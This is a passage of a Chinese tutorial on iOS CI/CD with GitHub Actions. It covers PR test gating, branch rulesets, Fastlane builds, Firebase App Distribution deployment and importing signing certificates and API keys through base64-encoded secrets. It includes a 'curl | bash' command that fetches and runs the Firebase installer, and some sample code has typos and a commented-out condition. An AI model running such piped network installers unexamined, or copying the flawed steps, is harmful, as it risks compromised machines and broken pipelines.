+CD— Nightly Build 執行快照+單元測試+打包+部署到 Firebase App Distribution 因 Demo 限制，本文只會串接 打包部署到 Firebase App Distribution，打包到 Testflight 或是 App Store 也是同樣步驟只差別在 Fastlane 裡的腳本不同，大家可以自行發揮。CI — 發 Pull Request 執行單元測試流程Develop 分支 無法直接推送 ，必須發 Pull Request 才能更新；所有 Pull Request 均需 Review 通過加上單元測試通過才能 Merge 、有新 Commit Push 會重新測試。CI-Testing.ymlRepo → Actions → New workflow → set up a workflow yourself。# Workflow(Action) 名稱name: CI-Testing# Actions Log 的標題名稱run-name: \"[CI-Testing] ${{ github.event.pull_request.title || github.ref }}\"# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 Push Commit 觸發的任務還沒執行就又 Push Commit 時，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.event.pull_request.number || github.ref }} cancel-in-progress: true# 觸發事件on: # PR 事件 pull_request: # PR - 開啟、重開、有新 Push Commit 時 types: [opened, synchronize, reopened] # 手動表單觸發 workflow_dispatch: # 表單 Inputs 欄位 inputs: # 執行的 Test Fastlane Lane TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' type: choice options: - run_unit_tests - run_all_tests # 其他 Workflow 呼叫此 Workflow 觸發 # Nightly Build 會呼叫使用 workflow_call: # 表單 Inputs 欄位 inputs: # 執行的 Test Fastlane Lane TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' # workflow_call inputs 不支援 choice type: string BRANCH: description: 'Branch' type: string # Job 工作項目# Job 會並發執行jobs: # Job ID testing: # Job 名稱 (可省略，有設定在 Log 顯示比較好讀) name: Testing # Runner Label - 使用 GitHub Hosted Runner macos-15 來執行工作 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 如果是 Private Repo 需要按計量收費，macOS 機器是最貴的(10倍)，可能跑 10 次就達到 2,000 分鐘免費上限 # 建議使用 self-hosted Runner runs-on: macos-15 # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 30 # use zsh # 可省略，只是我習慣用 zsh，預設是 bash defaults: run: shell: zsh {0} # 工作步驟 # 工作步驟會照順序執行 steps: # git clone 當前專案 &amp; checkout 到執行的分支 - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage，我們的測試環境用不到 # default: false lfs: false # 如果有指定則 Checkout 指定分支，沒有則使用預設(當前分支) # 因 on: schedule 事件只能在 main 主分支執行，因此想做 Nightly Build 之類的工作就需要指定分支 # e.g. on: schedule -&gt; main 分支，Nightly Build master 分支 ref: ${{ github.event.inputs.BRANCH || '' }} # ========== Env Setup Steps ========== # 讀取專案指定的 XCode 版本 # 在後續之中，我們自己手動指定使用的 XCode_x.x.x.app # 而不使用 xcversion，因為 xcversion 已經 sunset 不穩定。 - name: Read .xcode-version id: read_xcode_version run: | XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # 也可以直接在這指定全域 XCode 版本，這樣就不用在後續步驟指定 DEVELOPER_DIR # 但此指令需要 sudoer 權限，如果是 self-hosted runner 就要確定 runner 執行環境有 sudo 權限 # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # 讀取專案指定的 Ruby 版本 - name: Read .ruby-version id: read_ruby_version run: | RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # 安裝或設定 Runner Ruby 版本成專案指定版本 - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # 可設可不設，原因是之前在 self-hosted 起多個 runner 跑 CI/CD 因為 cocoapods repos 是共用目錄 # 解決的問題是：有很小的機率會出現在同時 pod install 時拉 cocoapods repos 出現衝突(因為預設都是用) $HOME/.cocoapods/ # GitHub Hosted Runner 則不需此設定 # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: | # # 每個 Runner 用自己的 .cocoapods 資料夾，防止資源衝突 # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # 請注意，就算是 self-hosted，Cache 目前也是 Cloud Cache 會計算用量 # 規則：7 天未 hit 自動刪除、單個 Cache 上限 10 GB、Action 成功才會 Cache # Public Repo: 免費無限制 # Private Repo: 5 GB 起 # Self-hosted 可以自己用 shell script 撰寫 Cache &amp; Restore 策略或使用其他工具協助 # Bundle Cache (Gemfile) # 對應 Makefile 中我們指定了 Bundle 安裝路徑 ./vendor 下 - name: Cache Bundle uses: actions/cache@v3 with: path: | ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: | ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # 默認就是 專案/Pods 下 - name: Cache CocoaPods uses: actions/cache@v3 with: path: | ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: | ${{ runner.os }}-cocoapods- # Mint cache # 對應 Makefile 中我們指定的 Mint 安裝路徑 ./mint 下 - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: | ${{ runner.os }}-mint- # ==================== # 專案 Setup &amp; 依賴安裝 - name: Setup &amp; Install Dependency run: | # 執行 Makefile 中封裝的 Setup 指令，對應成指令大概是： # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... # 等等 setup 指令 make setup # 執行 Makefile 中封裝的 Install 指令，對應成指令大概是： # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... # 等等 install 指令 make install # 執行 Fastlane Unit 測試 Lane - name: Run Tests id: testing # 指定工作目錄，這樣後續指令就不用在特別 cd ./Product/ working-directory: ./Product/ env: # 測試計劃，全跑還是只跑單元測試 # 如為開 PR 觸發則使用 run_unit_tests，否則看 inputs.TEST_LANE 的值，預設值 run_all_tests TEST_LANE: ${{ github.event_name == 'pull_request' &amp;&amp; 'run_unit_tests' || github.event.inputs.TEST_LANE || 'run_all_tests' }} # 指定這個 Job 要使用 XCode_x.x.x 指定的版本執行 DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # 使用的模擬器名稱 SIMULATOR_NAME: ${{ vars.SIMULATOR_NAME }} # 模擬器的 iOS 版本 SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # 當前 Runner 名稱 RUNNER_NAME: ${{ runner.name }} # 提升 XCodebuild 指令 timeout 時間, retry 次數 # 因為機器 Loading 比較大的時候可能 3 次就失敗了 FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 60 FASTLANE_XCODEBUILD_SETTINGS_RETRIES: 10 run: | # 如果是 self-hosted 在同一台機器起多個 Runner 會出現搶模擬器的問題 (文章後會講) # 要避免這問題建議將模擬名稱命名成 Runner 名稱，每個 Runner 都設一個模擬器，這樣就不會互搶導致測試失敗 # e.g. bundle exec fastlane run_unit_tests device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" # 這邊是用 GitHub Hosted Runner 沒這問題，所以直接用 device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" # 發生錯誤不直接退出並將所有輸出都寫入 temp/testing_output.txt 檔案 # 後續我們會分析檔案內容區分出是 Build Failed 還是 Test Failed，Comment 不同訊息到 PR set +e # EXIT_CODE 儲存執行結果的 exit code. # 0 = OK # 1 = exit EXIT_CODE=0 # 所有輸出都寫入檔案 bundle exec fastlane ${TEST_LANE} device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" | tee \"$RUNNER_TEMP/testing_output.txt\" # 如果目前 EXIT_CODE 是 0，則將 ${pipestatus[1]} 賦值給 EXIT_CODE [[ $EXIT_CODE -eq 0 ]] &amp;&amp; EXIT_CODE=${pipestatus[1]} # 恢復出錯就退出 set -e # 檢查 Testing Output # 如果 Testing Output 包含 \"Error building\"，則設 is_build_error=true 給 Actions 環境變數，為 Build 就失敗 # 如果 Testing Output 包含 \"Tests have failed\"，則設 is_test_error=true 給 Actions 環境變數，為測試失敗 if grep -q \"Error building\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_build_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"❌ Detected Build Error\" elif grep -q \"Tests have failed\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_test_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"❌ Detected Test Error\" fi # 恢復 Exit Code Output exit $EXIT_CODE # ========== Handle Result Steps ========== # 解析 *.junit 測試報告，並標記結果、Comment(如果是 PR 的話) - name: Publish Test Report # 直接復用別人寫好的 .junit Paser Actions: https://github.com/mikepenz/action-junit-report uses: mikepenz/action-junit-report@v5 # if: # 上一步(Testing) success or # 上一步(Testing) failed and is_test_error (build failed 不執行這個 step) if: ${{ (failure() &amp;&amp; steps.testing.outputs.is_test_error == 'true') || success() }} with: check_name: \"Testing Report\" comment: true updateComment: false require_tests: true detailed_summary: true report_paths: \"./Product/fastlane/test_output/*.junit\" # 測試建置失敗 Comment - name: Build Failure Comment # if: # 上一步(Testing) failed and is_build_error and 有 PR Number # if: ${{ failure() &amp;&amp; steps.testing.outputs.is_build_error == 'true' &amp;&amp; github.event.pull_request.number }} uses: actions/github-script@v6 env: action_url: \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}\" with: script: | const action_url = process.env.action_url const pullRequest = context.payload.pull_request || {} const commitSha = pullRequest.head?.sha || context.sha const creator = pullRequest.user?.login || context.actor const commentBody = [ `# 專案或測試建置失敗 ❌`, `請確認您的 Pull Request 是否可以正確編譯與執行測試。`, ``, `🔗 **Action**: [View Workflow Run](${action_url})`, `📝 **Commit**: ${commitSha}`, `👤 **Author**: @${creator}` ].join('\\n') await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: context.payload.pull_request.number, body: commentBody })技術重點說明： runs-on: 建議改用 self-hosted Runner， GitHub Hosted Runner macOS 很貴的 。 手動讀取 .xcode-version 檔案取得指定的 XCode 版本並在需要指定 XCode 的 Step 設定 DEVELOPER_DIR env 可以輕鬆免 Sudo 切換 XCode Cache: 可以加速依賴安裝速度，但需注意就算是 self-hosted Runner 依然會使用 GitHub Cloud Cache，受到收費限制 使用 set +e 使指令執行失敗不會馬上退出+將 output 都輸出到檔案+讀取檔案判斷是 Build Failed or Test Failed；如果不這樣做訊息統一都會是 Test Failed。也可以延伸去判斷其他錯誤，例如： Underlying Error: Unable to boot the Simulator. 模擬器啟動失敗，請重新嘗試。 Checkout Code 可接受指定分支：因為 on: schedule 事件只能在 main (Default Branch) 觸發，如果我們希望排程對某個其他分支操作，就需要指定分支。 指定 .cocoapods Repo 路徑可做可不做，之前是遇過 self-hosted 同一台機器兩個 Runner 同時卡在 pod install 就是因為剛好都在針對 .cocoapods Repo 操作造成 git lock。(但機率很低就是了) 如果你有 Private Pods Repo 需要設定 SSH Agent 才有權限 Clone。 (請參考文末補充) 記得到 Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables 新增：SIMULATOR_IOS_VERSION 模擬器 iOS 版本SIMULATOR_NAME 模擬器名稱Commit 檔案到 Repo 主分支，手動觸發一次驗證正不正確：正確後繼續設定。GitHub 流程設定Repo → Settins → Rules → Rulesets。 Ruleset Name: 規則名稱 Enforcement status: 啟用/停用 此規則限制 Target branches: 目標的 Base 分支，設 Default Branch 就是所有想合進到 main or develop 的分支都受到此規則限制 Bypass list: 可指定特殊身份、Team 可以不受此限 Branch rules: Restrict deletions: 禁止刪除分支 Require a pull request before mergin: 只能透過 PR MergeRequired approvals: 限制需要幾人 Approve Require status checks to pass: 限制哪些 Checks 要 Passed 才能 Merge點 + Add checks 輸入 Testing 選擇有 GitHub Actions 標誌的。這邊有個小問題，如果 Suggestions 找不到 Testing 那需要先回到 Actions 觸發(開 PR 試試)成功一次，這裡才會出現。 Block force pushes: 禁止 Force push儲存、確定 Enforcement status 是 Active 後，規則就會生效了。都設定好之後，開 PR 測試看看： Checks 有出現 CI-Testing ( Requried )、Merging is blocked、At least X approving review is required by reviewers with write access. 代表設置成功了。如果專案建置失敗 (Build Failed) 會 Comment：如果專案建置成功但測試案例失敗 (Test Failed) 會 Comment：如果專案建置成功測試也成功(Test Success) 會 Comment：完成 Review Approve + Check 測試通過後：Demo PR就能 Merge PR。 如果有 Push New Commit 會自動重跑 Checks 測試。完整程式碼： CI-Testing.ymlAuto-merge:另外，也可以打開 Repo Settings → General → Pull Request 中的： Automatically delete head branches: Merge PR 後自動刪除分支 Allow Auto-merge: 當 Checks 通過＋符合條件的 Approvals 達成會自動 Merge PR只有當有設條件＋當前條件還不能 Merge 時才會出現 Enable auto-merge 按鈕。CD — 打包+部署到 Firebase App Distribution流程使用 GitHub Actions 表單觸發打包工作，可指定版本號、Release Notes，打包完會自動上傳到 Firebase App Distribution 供團隊下載測試使用。CD-Deploy.ymlRepo → Actions → New workflow → set up a workflow yourself。# Workflow(Action) 名稱name: CD-Deploy# Actions Log 的標題名稱run-name: \"[CD-Deploy] ${{ github.ref }}\"# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 重複觸發相同分支的打包任務，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.ref }} cancel-in-progress: true# 觸發事件on: # 手動表單觸發 workflow_dispatch: # 表單 Inputs 欄位 inputs: # App 版本號 VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # 其他 Workflow 呼叫此 Workflow 觸發 # Nightly Build 會呼叫使用 workflow_call: inputs: # App 版本號 VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string BRANCH: description: 'Branch' type: string# 定義全域靜態變數env: APP_STORE_CONNECT_API_KEY_FILE_NAME: \"app_store_connect_api_key.json\"# Job 工作項目# Job 會並發執行jobs: # Job ID deploy: # Job 名稱 (可省略，有設定在 Log 顯示比較好讀) name: Deploy - Firebase App Distribution # Runner Label - 使用 GitHub Hosted Runner macos-15 來執行工作 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 請注意：因為此專案是 Public Repo 可以無限免費使用 # 如果是 Private Repo 需要按計量收費，macOS 機器是最貴的(10倍)，可能跑 10 次就達到 2,000 分鐘免費上限 # 建議使用 self-hosted Runner runs-on: macos-15 # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 30 # use zsh # 可省略，只是我習慣用 zsh，預設是 bash defaults: run: shell: zsh {0} # 工作步驟 # 工作步驟會照順序執行 steps: # git clone 當前專案 &amp; checkout 到執行的分支 - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage，我們的測試環境用不到 # default: false lfs: false # 如果有指定則 Checkout 指定分支，沒有則使用預設(當前分支) # 因 on: schedule 事件只能在 main 主分支執行，因此想做 Nightly Build 之類的工作就需要指定分支 # e.g. on: schedule -&gt; main 分支，Nightly Build master 分支 ref: ${{ github.event.inputs.BRANCH || '' }} # ========== Certificates Steps ========== # 建議是使用 Fastlnae - Match 管理開發憑證並在 Lane 中直接執行 match 安裝設定好 # Match 會用另一個 Private Repo 管理憑證，但要設定好 SSH Agent 才有權限 git clone private repo # ref: https://stackoverflow.com/questions/57612428/cloning-private-github-repository-within-organisation-in-actions # # # --- 以下是沒有使用 Fastlane - Match 的情況下直接下載 &amp; Import 憑證給 Runner 的做法 --- # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development # # GitHub Actions Secret 無法儲存檔案，因此所有憑證檔案都要先轉成 Base64 Encoded 文字格式存在 Secret # 在 GitHub Actions Step 中再動態讀出來寫入 TEMP 檔案並移動到正確位置給系統讀取使用 # 其他設定細節請參考文章 # - name: Install the Apple certificate and provisioning profile env: BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }} P12_PASSWORD: ${{ secrets.BUILD_CERTIFICATE_P12_PASSWORD }} BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }} # GitHub Hosted Runner 為自定義字串 # Self-hosted Runner 為機器登入密碼 KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }} run: | # create variables CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12 PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db # import certificate and provisioning profile from secrets echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH # create temporary keychain security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security set-keychain-settings -lut 21600 $KEYCHAIN_PATH security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH # import certificate to keychain security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security list-keychain -d user -s $KEYCHAIN_PATH # apply provisioning profile mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles # App Store Connect API Fastlane JSON Key # 另一個在打包環境幾乎是必須的 App Store Connect API Fastlane JSON Key (.json) # format: .json 內容格式：https://docs.fastlane.tools/app-store-connect-api/ # 裡面包含 App Store Connect API .p8 Key # 會在後續帶給 Fastlane，用於上傳到 Testflight、App Store API 使用 # # GitHub Actions Secret 無法儲存檔案，因此所有憑證檔案都要先轉成 Base64 Encoded 文字格式存在 Secret # 在 GitHub Actions Step 中再動態讀出來寫入 TEMP 檔案供其他步驟引用使用 # 其他設定細節請參考文章 - name: Read and Write Apple Store Connect API Key to Temp env: APP_STORE_CONNECT_API_KEY_BASE64: ${{ secrets.APP_STORE_CONNECT_API_KEY_BASE64 }} APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: | # import certificate and provisioning profile from secrets echo -n \"$APP_STORE_CONNECT_API_KEY_BASE64\" | base64 --decode -o $APP_STORE_CONNECT_API_KEY_PATH # ========== Env Setup Steps ========== # 讀取專案指定的 XCode 版本 # 在後續之中，我們自己手動指定使用的 XCode_x.x.x.app # 而不使用 xcversion，因為 xcversion 已經 sunset 不穩定。 - name: Read .xcode-version id: read_xcode_version run: | XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # 也可以直接在這指定全域 XCode 版本，這樣就不用在後續步驟指定 DEVELOPER_DIR # 但此指令需要 sudoer 權限，如果是 self-hosted runner 就要確定 runner 執行環境有 sudo 權限 # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # 讀取專案指定的 Ruby 版本 - name: Read .ruby-version id: read_ruby_version run: | RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # 安裝或設定 Runner Ruby 版本成專案指定版本 - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # 可設可不設，原因是之前在 self-hosted 起多個 runner 跑 CI/CD 因為 cocoapods repos 是共用目錄 # 解決的問題是：有很小的機率會出現在同時 pod install 時拉 cocoapods repos 出現衝突(因為預設都是用) $HOME/.cocoapods/ # GitHub Hosted Runner 則不需此設定 # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: | # # 每個 Runner 用自己的 .cocoapods 資料夾，防止資源衝突 # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # 請注意，就算是 self-hosted，Cache 目前也是 Cloud Cache 會計算用量 # 規則：7 天未 hit 自動刪除、單個 Cache 上限 10 GB、Action 成功才會 Cache # Public Repo: 免費無限制 # Private Repo: 5 GB 起 # Self-hosted 可以自己用 shell script 撰寫 Cache &amp; Restore 策略或使用其他工具協助 # Bundle Cache (Gemfile) # 對應 Makefile 中我們指定了 Bundle 安裝路徑 ./vendor 下 - name: Cache Bundle uses: actions/cache@v3 with: path: | ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: | ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # 默認就是 專案/Pods 下 - name: Cache CocoaPods uses: actions/cache@v3 with: path: | ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: | ${{ runner.os }}-cocoapods- # Mint cache # 對應 Makefile 中我們指定的 Mint 安裝路徑 ./mint 下 - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: | ${{ runner.os }}-mint- # ==================== # 專案 Setup &amp; 依賴安裝 - name: Setup &amp; Install Dependency run: | # 執行 Makefile 中封裝的 Setup 指令，對應成指令大概是： # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... # 等等 setup 指令 make setup # 執行 Makefile 中封裝的 Install 指令，對應成指令大概是： # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... # 等等 install 指令 make install - name: Deploy Beta id: deploy # 指定工作目錄，這樣後續指令就不用在特別 cd ./Product/ working-directory: ./Product/ env: # 打包 Input 參數 VERSION_NUMBER: ${{ inputs.VERSION_NUMBER || '' }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER || '' }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE || '' }} AUTHOR: ${{ github.actor }} # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets # Firebase CLI Token 密鑰 (取得方式請參考文章) FIREBASE_CLI_TOKEN: ${{ secrets.FIREBASE_CLI_TOKEN }} # Apple Developer Program Team ID TEAM_ID: ${{ secrets.TEAM_ID }} # 指定這個 Job 要使用 XCode_x.x.x 指定的版本執行 DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" run: | # 取得當前 Timestamp BUILD_TIMESTAMP=$(date +'%Y%m%d%H%M%S') # 如果 BUILD_NUMBER 沒有值，用 Timestamp 當 App Build Number BUILD_NUMBER=\"${BUILD_NUMBER:-$BUILD_TIMESTAMP}\" ID=\"${{ github.run_id }}\" COMMIT_SHA=\"${{ github.sha }}\" BRANCH_NAME=\"${{ github.ref_name }}\" AUTHOR=\"${{ env.AUTHOR }}\" # 組合 Release Note RELEASE_NOTE=\"${{ env.RELEASE_NOTE }} ID: ${ID} Commit SHA: ${COMMIT_SHA} Branch: ${BRANCH_NAME} Author: ${AUTHOR} \" # 執行 Fastlane 打包＆部署 Lane bundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\" # GitHub Actions 建議的 self-hosted 安全性設定： # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development#required-clean-up-on-self-hosted-runners # 對應 Step: Install the Apple certificate and provisioning profile # 用途是刪除機器上下載下來的金鑰憑證 # 如果你是用 Match 則需要改寫成 Match 的 Clean - name: Clean up keychain and provisioning profile if: ${{ always() &amp;&amp; contains(runner.labels, 'self-hosted') }} run: | security delete-keychain $RUNNER_TEMP/app-signing.keychain-db rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision 記得到 Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets 新增一個 TEAM_ID 變數，內容是 Apple Developer Team ID 字串。Commit 檔案到 Repo 主分支，測試看看打包功能： 請注意若其他分支要使用此 Action 需要先 Merge 主分支的 CD-Deploy.yml 檔案。等待任務跑完：Demo 打包＋部署成功 ✅完整程式碼： CD-Deploy.yml技術細節 — Firebase CLI Token 取得＆設定按照 Firebase 官方文件步驟 ：先安裝好 Firebase CLI 工具：curl -sL https://firebase.tools | bash執行：firebase login:ci完成登入、授權：回到 Terminal 複製 Firebase CLI Token:到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: FIREBASE_CLI_TOKEN 並貼上 Firebase CLI Token。 這個 Token = 你的登入身份 ，請妥善保存，如果帳號離職也需要進行更換。技術細節 — Install the Apple certificate and provisioning profile補充開發憑證匯入 Runner 的步驟細節。因 GitHub Actions Secret 無法儲存檔案，因此所有憑證檔案都要先轉成 Base64 Encoded 文字格式存在 Secrets，GitHub Actions Step 中再動態讀出來寫入 TEMP 檔案並移動到正確位置給系統讀取使用。打包 Development 需要兩把金鑰憑證： Provision Profile ( .mobileprovision) Development Certifcate ( .p12)cicd.mobileprovisiondevelopment.cer從 Apple Developer 中下載的 Certificate 是 .cer 格式，而我們需要的是 .p12 格式，可以先把下載下來的 .cer 點兩下安裝到 Keychain，然後打開 Keychain 選擇該憑證右鍵 Export 匯出。檔案名稱：cicd.p12、格式 .p12P12 金鑰密碼：輸入一組安全的自訂義字串 (範例是不好的示範，用 123456 )現在兩個檔案： cicd.p12、cicd.mobileprovision 都準備好了轉換成 BASE64 格式字串並存到 Repo Secrets：base64 -i cicd.mobileprovision | pbcopy到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: BUILD_PROVISION_PROFILE_BASE64 並貼上以上內容。-base64 -i cicd.p12 | pbcopy到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: BUILD_CERTIFICATE_BASE64 並貼上以上內容。-到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: P12_PASSWORD 內容是剛匯出 P12 金鑰設定的密碼。-到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: KEYCHAIN_PASSWORD ：如果是 GitHub Hosted Runner 則隨便輸入一個任意字串， 如果是 Self-hosted Runner 則為 macOS Runner 使用者的登入密碼 。技術細節 —App Store Connect API KeyFastlane 打包部署到 App Store, Testflight 必須提供的 .json 金鑰 ，同樣受限 GitHub Actions Secrets 只能存字串不能存檔案，所以我們也要把金鑰內容轉成 Base64 字串，GitHub Actions Step 中再動態讀出來寫入 TEMP 檔案並把檔案路徑給 Fastlane 引用使用。首先到 App Store Connect 建立&amp;下載好 App Store Connect API Key ( .p8) ：-----BEGIN PRIVATE KEY-----sssaxzzvcxzzxzvzcxvvzxcvzxvczxcvz-----END PRIVATE KEY-----新增一個 app_store_connect_api.json 檔案( 內容參考 )：{ \"key_id\": \"App Store Connect 上寫的 Key ID\", \"issuer_id\": \"App Store Connect 上寫的 Issuer ID\", \"key\": \"-----BEGIN PRIVATE KEY-----記得把換行改成\\n-----END PRIVATE KEY-----\", \"duration\": 1200, # optional (maximum 1200) \"in_house\": false # optional but may be required if using match/sigh}儲存檔案後執行：base64 -i app_store_connect_api.json | pbcopy將字串內容貼到 Repo → Settings → Secrets and variables → Actions → 新增一個 Secret: APP_STORE_CONNECT_API_KEY_BASE64 並貼上以上內容。Read and Write Apple Store Connect API Key to Temp Step 完成之後在後續的 Step 只要傳入 env APP_STORE_CONNECT_API_KEY_PATH :- name: Deploy env: APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: | ....Fastlane 就能自動取得使用。技術延伸 — Reuse Action Workflow 拆分打包和部署動作在這個案例中我們直接使用 Fastlane beta Lane 執行打包＋部署兩個動作。在實際案例中我們可能需要將同一包打包結果分別部署到不同平台上(Firebase, Testflight…etc) 因此比較好的做法是打包是一個 Action、部署是一個 Action，不然會重復跑兩次打包；而且也更符合 CI/CD 的權責劃分。 以下爲範例介紹：CI-Build.yml:name: Buildon: push: branches: - main workflow_call: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: runs-on: macos-latest steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make steup make instal - name: Build Project run: bundle exec fastlane build - name: Upload Build Artifact uses: actions/upload-artifact@v4 with: name: build-artifact path: ./fastlane/build/CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # 當 Build Action 